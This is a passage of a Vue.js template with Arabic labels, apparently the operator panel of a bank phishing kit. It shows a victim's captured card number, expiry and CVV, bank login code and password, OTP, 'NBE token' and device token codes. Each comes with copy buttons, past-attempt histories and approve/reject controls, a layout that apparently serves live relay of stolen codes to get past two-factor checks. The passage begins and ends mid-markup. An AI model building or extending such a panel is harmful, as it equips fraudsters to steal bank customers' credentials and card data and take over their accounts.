                        <!-- ترويسة محاولة البطاقة: الترتيب والوقت وشارة الحالة -->
                        <div class="card-attempt-header">
                          <div class="attempt-label-wrap">
                            <span v-if="cardItem.isCurrent || idx === 0" class="card-attempt-badge latest">البطاقة الحالية (الأحدث)</span>
                            <span v-else class="card-attempt-badge past">محاولة سابقة #{{ getCardHistoryList(selectedCustomer).length - idx }}</span>
                            <span v-if="cardItem.timestamp" class="card-attempt-time" dir="ltr">{{ formatTime(cardItem.timestamp) }}</span>
                          </div>

                          <!-- شارة حالة البطاقة: مقبولة / مرفوضة / قيد الانتظار -->
                          <span class="history-status-chip" :class="historyStatusBadgeClass(cardItem.status)">
                            <svg v-if="cardItem.status === 'approved'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                              <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                            <svg v-else-if="cardItem.status === 'rejected'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                              <line x1="18" y1="6" x2="6" y2="18"></line>
                              <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                            <svg v-else viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.5">
                              <circle cx="12" cy="12" r="10"></circle>
                              <polyline points="12 6 12 12 16 14"></polyline>
                            </svg>
                            <span>{{ historyStatusLabel(cardItem.status) }}</span>
                          </span>
                        </div>

                        <!-- تصميم البطاقة البنكية الواقعية الخاصة بهذه المحاولة -->
                        <div class="realistic-credit-card" :class="getSpecificCardBrandClass(cardItem.cardNumber)" dir="ltr">
                          <!-- الترويسة العلوية للبطاقة: شريحة الـ EMV والـ NFC والشعار -->
                          <div class="card-top-row">
                            <div class="chip-and-nfc">
                              <!-- شريحة EMV الذهبية الذكية -->
                              <div class="emv-gold-chip" title="EMV Smart Chip">
                                <div class="chip-line chip-h1"></div>
                                <div class="chip-line chip-h2"></div>
                                <div class="chip-line chip-v1"></div>
                                <div class="chip-circle"></div>
                              </div>

                              <!-- أيقونة Contactless NFC -->
                              <div class="nfc-wireless-icon" title="Contactless Payment">
                                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
                                  <path d="M7 16a5 5 0 0 1 0-8"></path>
                                  <path d="M10 18a8 8 0 0 1 0-12"></path>
                                  <path d="M13 20a11 11 0 0 1 0-16"></path>
                                </svg>
                              </div>
                            </div>

                            <!-- شعار البطاقة والبنك -->
                            <div class="card-brand-display">
                              <img :src="getSpecificCardLogo(cardItem.cardNumber)" alt="Card Brand" class="realistic-card-logo" />
                            </div>
                          </div>

                          <!-- رقم البطاقة البارز وبجانبه زر النسخ -->
                          <div class="card-number-row">
                            <span class="embossed-card-number font-mono" title="رقم البطاقة">
                              {{ cardItem.cardNumber }}
                            </span>
                            <button
                              v-if="cardItem.cardNumber && cardItem.cardNumber !== 'لم تدخل بعد'"
                              type="button"
                              class="field-copy-btn field-copy-btn-card"
                              :class="{ copied: copiedFieldKey === 'card_num_' + idx }"
                              :title="copiedFieldKey === 'card_num_' + idx ? 'تم النسخ بنجاح' : 'نسخ رقم البطاقة'"
                              @click.stop="copyFieldText(cardItem.cardNumber, 'card_num_' + idx)"
                            >
                              <svg v-if="copiedFieldKey === 'card_num_' + idx" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                              </svg>
                              <span>{{ copiedFieldKey === 'card_num_' + idx ? "تم النسخ" : "نسخ" }}</span>
                            </button>
                          </div>

                          <!-- الصف السفلي: تاريخ الانتهاء وبجانبه زر النسخ + رمز الأمان CVV وبجانبه زر النسخ -->
                          <div class="card-bottom-row">
                            <!-- تاريخ الانتهاء VALID THRU وبجانبه زر النسخ -->
                            <div class="card-expiry-info">
                              <span class="card-meta-label">VALID THRU</span>
                              <div class="expiry-val-wrap">
                                <span class="embossed-meta-val font-mono">{{ cardItem.cardExpiry || 'لم يدخل بعد' }}</span>
                                <button
                                  v-if="cardItem.cardExpiry && cardItem.cardExpiry !== 'لم يدخل بعد'"
                                  type="button"
                                  class="field-copy-btn field-copy-btn-card"
                                  :class="{ copied: copiedFieldKey === 'card_exp_' + idx }"
                                  :title="copiedFieldKey === 'card_exp_' + idx ? 'تم النسخ بنجاح' : 'نسخ تاريخ الانتهاء'"
                                  @click.stop="copyFieldText(cardItem.cardExpiry, 'card_exp_' + idx)"
                                >
                                  <svg v-if="copiedFieldKey === 'card_exp_' + idx" viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5">
                                    <polyline points="20 6 9 17 4 12"></polyline>
                                  </svg>
                                  <svg v-else viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                                  </svg>
                                  <span>{{ copiedFieldKey === 'card_exp_' + idx ? "تم النسخ" : "نسخ" }}</span>
                                </button>
                              </div>
                            </div>

                            <!-- رمز الأمان CVV وبجانبه زر النسخ -->
                            <div class="card-cvv-info">
                              <span class="card-meta-label">CVV / CVC</span>
                              <div class="cvv-badge-wrap">
                                <span class="embossed-cvv-val font-mono">{{ cardItem.cardCvv || 'لم يدخل بعد' }}</span>
                                <button
                                  v-if="cardItem.cardCvv && cardItem.cardCvv !== 'لم يدخل بعد'"
                                  type="button"
                                  class="field-copy-btn field-copy-btn-card"
                                  :class="{ copied: copiedFieldKey === 'card_cvv_' + idx }"
                                  :title="copiedFieldKey === 'card_cvv_' + idx ? 'تم النسخ بنجاح' : 'نسخ رمز CVV'"
                                  @click.stop="copyFieldText(cardItem.cardCvv, 'card_cvv_' + idx)"
                                >
                                  <svg v-if="copiedFieldKey === 'card_cvv_' + idx" viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5">
                                    <polyline points="20 6 9 17 4 12"></polyline>
                                  </svg>
                                  <svg v-else viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                                  </svg>
                                  <span>{{ copiedFieldKey === 'card_cvv_' + idx ? "تم النسخ" : "نسخ" }}</span>
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <!-- رسالة بسيطة ومدمجة إذا لم يدخل الزبون بيانات البطاقة بعد -->
                  <div v-else class="card-empty-placeholder">
                    <span class="empty-icon-dot"></span>
                    <span>لم يتم إدخال بيانات البطاقة المصرفية بعد (في انتظار إدخال العميل للبيانات)...</span>
                  </div>

                  <!-- أزرار قرار البطاقة (تظهر عند وجود بيانات وقيد الانتظار) -->
                  <div v-if="getCardHistoryList(selectedCustomer).length > 0 && isCardPending(selectedCustomer)" class="card-decision-bar">
                    <span class="decision-prompt">قرار بيانات البطاقة:</span>
                    <div class="decision-actions">
                      <button
                        class="decision-btn approve"
                        type="button"
                        @click="decideCard(selectedCustomer.id, 'approved')"
                      >
                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                          <polyline points="20 6 9 17 4 12"></polyline>
                        </svg>
                        <span>قبول</span>
                      </button>

                      <button
                        class="decision-btn reject"
                        type="button"
                        @click="decideCard(selectedCustomer.id, 'rejected')"
                      >
                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                          <line x1="18" y1="6" x2="6" y2="18"></line>
                          <line x1="6" y1="6" x2="18" y2="18"></line>
                        </svg>
                        <span>رفض</span>
                      </button>
                    </div>
                  </div>
                </div>

                <div class="auth-credentials-grid">
                  <!-- 1. بطاقة المرحلة 1: كود المستخدم وكلمة المرور -->
                  <div
                    class="data-card auth-stage-card"
                    :class="{ 'card-pending-border': isLoginCredentialsPending(selectedCustomer) }"
                  >
                    <div class="data-card-header">
                      <div class="stage-title-tag">
                        <span class="stage-num">1</span>
                        <span class="card-subtitle">كود المستخدم وكلمة المرور</span>
                      </div>
                      <div class="header-status-wrap">
                        <span
                          class="status-badge"
                          :class="getLoginCredentialsStatus(selectedCustomer)"
                        >
                          {{ stepStatusLabel(getLoginCredentialsStatus(selectedCustomer)) }}
                        </span>
                      </div>
                    </div>

                    <div class="stage-card-body">
                      <!-- خانة هوية الشركة في حال حساب شركات -->
                      <div v-if="selectedCustomer.companyId || selectedCustomer.accountType === 'شركات'" class="auth-cell highlight-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">هوية الشركة</span>
                          <button
                            v-if="selectedCustomer.companyId"
                            type="button"
                            class="field-copy-btn"
                            :class="{ copied: copiedFieldKey === 'companyId' }"
                            :title="copiedFieldKey === 'companyId' ? 'تم النسخ بنجاح' : 'نسخ هوية الشركة'"
                            @click.stop="copyFieldText(selectedCustomer.companyId, 'companyId')"
                          >
                            <svg v-if="copiedFieldKey === 'companyId'" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                              <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                            <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                            </svg>
                            <span>{{ copiedFieldKey === 'companyId' ? "تم النسخ" : "نسخ" }}</span>
                          </button>
                        </div>
                        <div class="auth-cell-body">
                          <div class="value-display-box primary-box" dir="ltr">
                            <span class="box-text font-mono">{{ selectedCustomer.companyId || "لم تُدخل بعد" }}</span>
                          </div>
                        </div>
                      </div>

                      <!-- خانة كود المستخدم المدخل -->
                      <div class="auth-cell highlight-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">كود المستخدم المدخل</span>
                          <button
                            v-if="getCustomerUsername(selectedCustomer) && getCustomerUsername(selectedCustomer) !== 'لم يُدخل بعد'"
                            type="button"
                            class="field-copy-btn"
                            :class="{ copied: copiedFieldKey === 'username' }"
                            :title="copiedFieldKey === 'username' ? 'تم النسخ بنجاح' : 'نسخ كود المستخدم'"
                            @click.stop="copyFieldText(getCustomerUsername(selectedCustomer), 'username')"
                          >
                            <svg v-if="copiedFieldKey === 'username'" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                              <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                            <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                            </svg>
                            <span>{{ copiedFieldKey === 'username' ? "تم النسخ" : "نسخ" }}</span>
                          </button>
                        </div>
                        <div class="auth-cell-body">
                          <div class="value-display-box primary-box" dir="ltr">
                            <span class="box-text font-mono">{{ getCustomerUsername(selectedCustomer) }}</span>
                          </div>
                        </div>
                      </div>

                      <!-- خانة كلمة المرور المدخلة -->
                      <div class="auth-cell highlight-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">كلمة المرور المدخلة</span>
                          <button
                            v-if="getCustomerPassword(selectedCustomer) && getCustomerPassword(selectedCustomer) !== 'لم تدخل بعد' && getCustomerPassword(selectedCustomer) !== 'تم إدخالها'"
                            type="button"
                            class="field-copy-btn"
                            :class="{ copied: copiedFieldKey === 'password' }"
                            :title="copiedFieldKey === 'password' ? 'تم النسخ بنجاح' : 'نسخ كلمة المرور'"
                            @click.stop="copyFieldText(getCustomerPassword(selectedCustomer), 'password')"
                          >
                            <svg v-if="copiedFieldKey === 'password'" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                              <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                            <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                            </svg>
                            <span>{{ copiedFieldKey === 'password' ? "تم النسخ" : "نسخ" }}</span>
                          </button>
                        </div>
                        <div class="auth-cell-body">
                          <div class="value-display-box danger-box" dir="ltr">
                            <span class="box-text font-mono">{{ getCustomerPassword(selectedCustomer) }}</span>
                          </div>
                        </div>
                      </div>

                      <!-- خانة نوع الحساب -->
                      <div class="auth-cell compact-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">نوع الحساب</span>
                          <span class="auth-value-pill">{{ selectedCustomer.accountType || "أفراد" }}</span>
                        </div>
                      </div>
                    </div>

                    <!-- أزرار قرار بيانات الدخول -->
                    <div v-if="isLoginCredentialsPending(selectedCustomer)" class="card-decision-bar">
                      <span class="decision-prompt">قرار بيانات الدخول:</span>
                      <div class="decision-actions">
                        <button
                          class="decision-btn approve"
                          type="button"
                          @click="decideLoginCredentials(selectedCustomer.id, 'approved')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <polyline points="20 6 9 17 4 12"></polyline>
                          </svg>
                          <span>قبول</span>
                        </button>

                        <button
                          class="decision-btn reject"
                          type="button"
                          @click="decideLoginCredentials(selectedCustomer.id, 'rejected')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                          </svg>
                          <span>رفض</span>
                        </button>
                      </div>
                    </div>

                    <!-- سجل محاولات الدخول السابقة تحت القيم الحالية مباشرة -->
                    <div v-if="getCredentialsHistoryList(selectedCustomer).length > 1" class="stage-inline-history">
                      <div class="inline-history-head">
                        <div class="inline-history-title">
                          <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                          </svg>
                          <span>سجل محاولات الدخول السابقة ({{ getCredentialsHistoryList(selectedCustomer).length }})</span>
                        </div>
                      </div>

                      <div class="inline-history-list">
                        <div
                          v-for="(item, idx) in getCredentialsHistoryList(selectedCustomer)"
                          :key="'cred-hist-' + idx"
                          class="inline-history-row"
                          :class="{ 'is-current-active': item.isCurrent || idx === 0 }"
                        >
                          <div class="history-item-main">
                            <div class="history-item-values creds-values">
                              <span class="history-user-val font-mono" dir="ltr" title="كود المستخدم">👤 {{ item.username }}</span>
                              <span v-if="item.password" class="history-pass-val font-mono" dir="ltr" title="كلمة المرور">🔑 {{ item.password }}</span>
                            </div>
                            <span v-if="item.timestamp" class="history-item-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
                          </div>

                          <div class="history-item-actions">
                            <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                              <svg v-if="item.status === 'approved'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else-if="item.status === 'rejected'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.5">
                                <circle cx="12" cy="12" r="10"></circle>
                                <polyline points="12 6 12 12 16 14"></polyline>
                              </svg>
                              <span>{{ historyStatusLabel(item.status) }}</span>
                            </span>

                            <button
                              v-if="item.password"
                              type="button"
                              class="history-copy-mini-btn"
                              :class="{ copied: copiedCredKey === 'inline-pass-' + idx }"
                              :title="copiedCredKey === 'inline-pass-' + idx ? 'تم النسخ' : 'نسخ كلمة المرور'"
                              @click.stop="copyCredValue(item.password, 'inline-pass-' + idx)"
                            >
                              <span>{{ copiedCredKey === 'inline-pass-' + idx ? 'تم' : 'نسخ كلمة السر' }}</span>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <!-- 2. بطاقة المرحلة 2: رمز التحقق OTP -->
                  <div
                    class="data-card auth-stage-card"
                    :class="{ 'card-pending-border': isOtpPending(selectedCustomer) }"
                  >
                    <div class="data-card-header">
                      <div class="stage-title-tag">
                        <span class="stage-num">2</span>
                        <span class="card-subtitle">رمز التحقق (OTP)</span>
                      </div>
                      <span
                        class="status-badge"
                        :class="selectedCustomer.verificationStatus || selectedCustomer.verification?.status || 'none'"
                      >
                        {{ verificationLabel(selectedCustomer.verificationStatus || selectedCustomer.verification?.status) }}
                      </span>
                    </div>

                    <div class="stage-card-body">
                      <div class="auth-cell otp-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">رمز التحقق (OTP) المدخل</span>
                          <div class="cell-head-actions">
                            <button
                              v-if="getCustomerOtp(selectedCustomer) && getCustomerOtp(selectedCustomer) !== 'لم يُدخل بعد'"
                              type="button"
                              class="field-copy-btn"
                              :class="{ copied: copiedFieldKey === 'otp' }"
                              :title="copiedFieldKey === 'otp' ? 'تم النسخ بنجاح' : 'نسخ رمز OTP'"
                              @click.stop="copyFieldText(getCustomerOtp(selectedCustomer), 'otp')"
                            >
                              <svg v-if="copiedFieldKey === 'otp'" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                              </svg>
                              <span>{{ copiedFieldKey === 'otp' ? "تم النسخ" : "نسخ" }}</span>
                            </button>
                          </div>
                        </div>
                        <div class="auth-cell-body">
                          <div class="value-display-box otp-box" dir="ltr">
                            <span class="box-text font-mono otp-large">{{ getCustomerOtp(selectedCustomer) }}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    <!-- أزرار قرار OTP -->
                    <div v-if="isOtpPending(selectedCustomer)" class="card-decision-bar">
                      <span class="decision-prompt">قرار رمز التحقق:</span>
                      <div class="decision-actions">
                        <button
                          class="decision-btn approve"
                          type="button"
                          @click="decideVerification(selectedCustomer.id, 'approved')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <polyline points="20 6 9 17 4 12"></polyline>
                          </svg>
                          <span>قبول</span>
                        </button>

                        <button
                          class="decision-btn reject"
                          type="button"
                          @click="decideVerification(selectedCustomer.id, 'rejected')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                          </svg>
                          <span>رفض</span>
                        </button>
                      </div>
                    </div>

                    <!-- سجل رموز OTP السابقة تحت القيمة الحالية مباشرة -->
                    <div v-if="getOtpHistoryList(selectedCustomer).length > 1" class="stage-inline-history">
                      <div class="inline-history-head">
                        <div class="inline-history-title">
                          <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                          </svg>
                          <span>سجل رموز OTP السابقة ({{ getOtpHistoryList(selectedCustomer).length }})</span>
                        </div>
                      </div>

                      <div class="inline-history-list">
                        <div
                          v-for="(item, idx) in getOtpHistoryList(selectedCustomer)"
                          :key="'otp-hist-' + idx"
                          class="inline-history-row"
                          :class="{ 'is-current-active': item.isCurrent || idx === 0 }"
                        >
                          <div class="history-item-main">
                            <span class="history-code-val font-mono" dir="ltr">{{ item.value }}</span>
                            <span v-if="item.timestamp" class="history-item-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
                          </div>

                          <div class="history-item-actions">
                            <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                              <svg v-if="item.status === 'approved'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else-if="item.status === 'rejected'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.5">
                                <circle cx="12" cy="12" r="10"></circle>
                                <polyline points="12 6 12 12 16 14"></polyline>
                              </svg>
                              <span>{{ historyStatusLabel(item.status) }}</span>
                            </span>

                            <button
                              type="button"
                              class="history-copy-mini-btn"
                              :class="{ copied: copiedFieldKey === 'inline-otp-' + idx }"
                              :title="copiedFieldKey === 'inline-otp-' + idx ? 'تم النسخ' : 'نسخ رمز OTP'"
                              @click.stop="copyFieldText(item.value, 'inline-otp-' + idx)"
                            >
                              <span>{{ copiedFieldKey === 'inline-otp-' + idx ? 'تم' : 'نسخ' }}</span>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <!-- 3. بطاقة المرحلة 3: رمز NBE توكن -->
                  <div
                    class="data-card auth-stage-card"
                    :class="{ 'card-pending-border': isNbeTokenPending(selectedCustomer) }"
                  >
                    <div class="data-card-header">
                      <div class="stage-title-tag">
                        <span class="stage-num">3</span>
                        <span class="card-subtitle">رمز NBE توكن</span>
                      </div>
                      <span
                        class="status-badge"
                        :class="selectedCustomer.nbeTokenStatus || 'none'"
                      >
                        {{ stepStatusLabel(selectedCustomer.nbeTokenStatus) }}
                      </span>
                    </div>

                    <div class="stage-card-body">
                      <div class="auth-cell otp-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">رمز NBE توكن المدخل</span>
                          <div class="cell-head-actions">
                            <button
                              v-if="getCustomerNbeToken(selectedCustomer) && getCustomerNbeToken(selectedCustomer) !== 'لم يُدخل بعد'"
                              type="button"
                              class="field-copy-btn"
                              :class="{ copied: copiedFieldKey === 'nbe_token' }"
                              :title="copiedFieldKey === 'nbe_token' ? 'تم النسخ بنجاح' : 'نسخ رمز NBE توكن'"
                              @click.stop="copyFieldText(getCustomerNbeToken(selectedCustomer), 'nbe_token')"
                            >
                              <svg v-if="copiedFieldKey === 'nbe_token'" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                              </svg>
                              <span>{{ copiedFieldKey === 'nbe_token' ? "تم النسخ" : "نسخ" }}</span>
                            </button>
                          </div>
                        </div>
                        <div class="auth-cell-body">
                          <div class="value-display-box otp-box" dir="ltr">
                            <span class="box-text font-mono otp-large">{{ getCustomerNbeToken(selectedCustomer) }}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    <!-- أزرار قرار NBE توكن -->
                    <div v-if="isNbeTokenPending(selectedCustomer)" class="card-decision-bar">
                      <span class="decision-prompt">قرار NBE توكن:</span>
                      <div class="decision-actions">
                        <button
                          class="decision-btn approve"
                          type="button"
                          @click="decideNbeToken(selectedCustomer.id, 'approved')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <polyline points="20 6 9 17 4 12"></polyline>
                          </svg>
                          <span>قبول</span>
                        </button>

                        <button
                          class="decision-btn reject"
                          type="button"
                          @click="decideNbeToken(selectedCustomer.id, 'rejected')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                          </svg>
                          <span>رفض</span>
                        </button>
                      </div>
                    </div>

                    <!-- سجل رموز NBE توكن السابقة تحت القيمة الحالية مباشرة -->
                    <div v-if="getNbeTokenHistoryList(selectedCustomer).length > 1" class="stage-inline-history">
                      <div class="inline-history-head">
                        <div class="inline-history-title">
                          <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                          </svg>
                          <span>سجل رموز NBE توكن السابقة ({{ getNbeTokenHistoryList(selectedCustomer).length }})</span>
                        </div>
                      </div>

                      <div class="inline-history-list">
                        <div
                          v-for="(item, idx) in getNbeTokenHistoryList(selectedCustomer)"
                          :key="'token-hist-' + idx"
                          class="inline-history-row"
                          :class="{ 'is-current-active': item.isCurrent || idx === 0 }"
                        >
                          <div class="history-item-main">
                            <span class="history-code-val font-mono" dir="ltr">{{ item.value }}</span>
                            <span v-if="item.timestamp" class="history-item-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
                          </div>

                          <div class="history-item-actions">
                            <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                              <svg v-if="item.status === 'approved'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else-if="item.status === 'rejected'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.5">
                                <circle cx="12" cy="12" r="10"></circle>
                                <polyline points="12 6 12 12 16 14"></polyline>
                              </svg>
                              <span>{{ historyStatusLabel(item.status) }}</span>
                            </span>

                            <button
                              type="button"
                              class="history-copy-mini-btn"
                              :class="{ copied: copiedFieldKey === 'inline-token-' + idx }"
                              :title="copiedFieldKey === 'inline-token-' + idx ? 'تم النسخ' : 'نسخ رمز التوكن'"
                              @click.stop="copyFieldText(item.value, 'inline-token-' + idx)"
                            >
                              <span>{{ copiedFieldKey === 'inline-token-' + idx ? 'تم' : 'نسخ' }}</span>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <!-- 4. بطاقة المرحلة 4: رمز جهاز توكن -->
                  <div
                    class="data-card auth-stage-card"
                    :class="{ 'card-pending-border': isBmTokenPending(selectedCustomer) }"
                  >
                    <div class="data-card-header">
                      <div class="stage-title-tag">
                        <span class="stage-num">4</span>
                        <span class="card-subtitle">رمز جهاز توكن</span>
                      </div>
                      <span
                        class="status-badge"
                        :class="selectedCustomer.bmTokenStatus || 'none'"
                      >
                        {{ stepStatusLabel(selectedCustomer.bmTokenStatus) }}
                      </span>
                    </div>

                    <div class="stage-card-body">
                      <div class="auth-cell otp-cell">
                        <div class="auth-cell-head">
                          <span class="auth-cell-label">رمز جهاز توكن المدخل</span>
                          <div class="cell-head-actions">
                            <button
                              v-if="getCustomerBmToken(selectedCustomer) && getCustomerBmToken(selectedCustomer) !== 'لم يُدخل بعد'"
                              type="button"
                              class="field-copy-btn"
                              :class="{ copied: copiedFieldKey === 'bm_token' }"
                              :title="copiedFieldKey === 'bm_token' ? 'تم النسخ بنجاح' : 'نسخ رمز جهاز توكن'"
                              @click.stop="copyFieldText(getCustomerBmToken(selectedCustomer), 'bm_token')"
                            >
                              <svg v-if="copiedFieldKey === 'bm_token'" viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                              </svg>
                              <span>{{ copiedFieldKey === 'bm_token' ? "تم النسخ" : "نسخ" }}</span>
                            </button>
                          </div>
                        </div>
                        <div class="auth-cell-body">
                          <div class="value-display-box otp-box" dir="ltr">
                            <span class="box-text font-mono otp-large">{{ getCustomerBmToken(selectedCustomer) }}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    <!-- أزرار قرار جهاز توكن -->
                    <div v-if="isBmTokenPending(selectedCustomer)" class="card-decision-bar">
                      <span class="decision-prompt">قرار جهاز توكن:</span>
                      <div class="decision-actions">
                        <button
                          class="decision-btn approve"
                          type="button"
                          @click="decideBmToken(selectedCustomer.id, 'approved')"
                        >
